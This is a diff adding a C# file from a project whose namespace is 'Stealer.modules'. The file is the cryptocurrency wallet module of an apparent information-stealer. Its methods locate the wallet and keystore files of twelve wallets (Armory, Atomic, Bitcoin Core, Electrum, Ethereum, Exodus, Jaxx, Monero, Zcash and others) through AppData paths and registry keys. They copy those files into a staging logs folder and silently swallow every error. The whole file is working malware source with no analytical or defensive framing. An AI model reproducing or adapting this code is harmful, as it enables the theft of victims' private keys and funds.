@@ -1,0 +1,266 @@
+﻿using Microsoft.Win32;
+using System;
+using System.IO;
+
+namespace Stealer.modules
+{
+  internal class Wallets
+  {
+    public static string pathToLogs = Program.path;
+    public static string AppDate = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+
+    public static void GetWallets()
+    {
+      Directory.CreateDirectory(Wallets.pathToLogs + "\\Wallets");
+      Wallets.GetArmory();
+      Wallets.GetAtomicWallet();
+      Wallets.GetBitcoinCore();
+      Wallets.GetByteCoin();
+      Wallets.GetDashCore();
+      Wallets.GetElectrum();
+      Wallets.GetEthereum();
+      Wallets.GetExodus();
+      Wallets.GetJaxx();
+      Wallets.GetLitecoinCore();
+      Wallets.GetMonero();
+      Wallets.GetZcash();
+    }
+
+    public static void GetArmory()
+    {
+      if (!Directory.Exists(Wallets.AppDate + "\\Armory\\"))
+        return;
+      string str = "\\Wallets\\Armory\\";
+      try
+      {
+        foreach (FileInfo file in new DirectoryInfo(Wallets.AppDate + "\\Armory\\").GetFiles())
+        {
+          Directory.CreateDirectory(Wallets.pathToLogs + str);
+          file.CopyTo(Wallets.pathToLogs + str + file.Name);
+        }
+      }
+      catch
+      {
+      }
+    }
+
+    public static void GetAtomicWallet()
+    {
+      if (!Directory.Exists(Wallets.AppDate + "\\atomic\\Local Storage\\leveldb\\"))
+        return;
+      string str = "\\Wallets\\Atomic\\";
+      try
+      {
+        foreach (FileInfo file in new DirectoryInfo(Wallets.AppDate + "\\atomic\\Local Storage\\leveldb\\").GetFiles())
+        {
+          Directory.CreateDirectory(Wallets.pathToLogs + str);
+          file.CopyTo(Wallets.pathToLogs + str + file.Name);
+        }
+      }
+      catch
+      {
+      }
+    }
+
+    public static void GetBitcoinCore()
+    {
+      try
+      {
+        using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Bitcoin").OpenSubKey("Bitcoin-Qt"))
+        {
+          try
+          {
+            if (registryKey.GetValue("strDataDir") == null)
+              return;
+            Directory.CreateDirectory(Wallets.pathToLogs + "\\Wallets\\BitcoinCore\\");
+            File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", Wallets.pathToLogs + "\\BitcoinCore\\wallet.dat");
+          }
+          catch
+          {
+          }
+        }
+      }
+      catch
+      {
+      }
+    }
+
+    public static void GetByteCoin()
+    {
+      if (!Directory.Exists(Wallets.AppDate + "\\bytecoin"))
+        return;
+      try
+      {
+        foreach (FileInfo file in new DirectoryInfo(Wallets.AppDate + "\\bytecoin").GetFiles())
+        {
+          Directory.CreateDirectory(Wallets.pathToLogs + "\\Wallets\\Bytecoin\\");
+          if (file.Extension.Equals(".wallet"))
+            file.CopyTo(Wallets.pathToLogs + "\\Bytecoin\\" + file.Name);
+        }
+      }
+      catch
+      {
+      }
+    }
+
+    public static void GetDashCore()
+    {
+      try
+      {
+        using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Dash").OpenSubKey("Dash-Qt"))
+        {
+          try
+          {
+            if (registryKey.GetValue("strDataDir") == null)
+              return;
+            Directory.CreateDirectory(Wallets.pathToLogs + "\\Wallets\\DashCore\\");
+            File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", Wallets.pathToLogs + "\\DashCore\\wallet.dat");
+          }
+          catch
+          {
+          }
+        }
+      }
+      catch
+      {
+      }
+    }
+
+    public static void GetElectrum()
+    {
+      string str = "\\Wallets\\Electrum\\";
+      if (!Directory.Exists(Wallets.AppDate + "\\Electrum\\wallets"))
+        return;
+      try
+      {
+        foreach (FileInfo file in new DirectoryInfo(Wallets.AppDate + "\\Electrum\\wallets").GetFiles())
+        {
+          Directory.CreateDirectory(Wallets.pathToLogs + str);
+          file.CopyTo(Wallets.pathToLogs + str + file.Name);
+        }
+      }
+      catch
+      {
+      }
+    }
+
+    public static void GetEthereum()
+    {
+      string str = "\\Wallets\\Ethereum\\";
+      if (!Directory.Exists(Wallets.AppDate + "\\Ethereum\\keystore"))
+        return;
+      try
+      {
+        foreach (FileInfo file in new DirectoryInfo(Wallets.AppDate + "\\Ethereum\\keystore").GetFiles())
+        {
+          Directory.CreateDirectory(Wallets.pathToLogs + str);
+          file.CopyTo(Wallets.pathToLogs + str + file.Name);
+        }
+      }
+      catch
+      {
+      }
+    }
+
+    public static void GetExodus()
+    {
+      string str = "\\Wallets\\Exodus\\";
+      if (!Directory.Exists(Wallets.AppDate + "\\Exodus\\exodus.wallet\\"))
+        return;
+      try
+      {
+        foreach (FileInfo file in new DirectoryInfo(Wallets.AppDate + "\\Exodus\\exodus.wallet\\").GetFiles())
+        {
+          Directory.CreateDirectory(Wallets.pathToLogs + str);
+          file.CopyTo(Wallets.pathToLogs + str + file.Name);
+        }
+      }
+      catch
+      {
+      }
+    }
+
+    public static void GetJaxx()
+    {
+      string str = "\\Wallets\\Jaxx\\";
+      if (!Directory.Exists(Wallets.AppDate + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb\\"))
+        return;
+      try
+      {
+        foreach (FileInfo file in new DirectoryInfo(Wallets.AppDate + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb\\").GetFiles())
+        {
+          Directory.CreateDirectory(Wallets.pathToLogs + str);
+          file.CopyTo(Wallets.pathToLogs + str + file.Name);
+        }
+      }
+      catch
+      {
+      }
+    }
+
+    public static void GetLitecoinCore()
+    {
+      try
+      {
+        using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Litecoin").OpenSubKey("Litecoin-Qt"))
+        {
+          try
+          {
+            if (registryKey.GetValue("strDataDir") == null)
+              return;
+            Directory.CreateDirectory(Wallets.pathToLogs + "\\Wallets\\LitecoinCore\\");
+            File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", Wallets.pathToLogs + "\\LitecoinCore\\wallet.dat");
+          }
+          catch
+          {
+          }
+        }
+      }
+      catch
+      {
+      }
+    }
+
+    public static void GetMonero()
+    {
+      string str = "\\Wallets\\Monero\\";
+      try
+      {
+        using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("monero-project").OpenSubKey("monero-core"))
+        {
+          try
+          {
+            if (registryKey.GetValue("wallet_path") == null)
+              return;
+            Directory.CreateDirectory(Wallets.pathToLogs + str);
+            string sourceFileName = registryKey.GetValue("wallet_path").ToString().Replace("/", "\\");
+            Directory.CreateDirectory(Wallets.pathToLogs + str);
+            File.Copy(sourceFileName, Wallets.pathToLogs + str + sourceFileName.Split('\\')[sourceFileName.Split('\\').Length - 1]);
+          }
+          catch
+          {
+          }
+        }
+      }
+      catch
+      {
+      }
+    }
+
+    public static void GetZcash()
+    {
+      string str = "\\Wallets\\Zcash\\";
+      try
+      {
+        foreach (FileInfo file in new DirectoryInfo(Wallets.AppDate + "\\Zcash\\").GetFiles())
+        {
+          Directory.CreateDirectory(Wallets.pathToLogs + str);
+          file.CopyTo(Wallets.pathToLogs + str + file.Name);
+        }
+      }
+      catch
+      {
+      }
+    }
+  }
+}
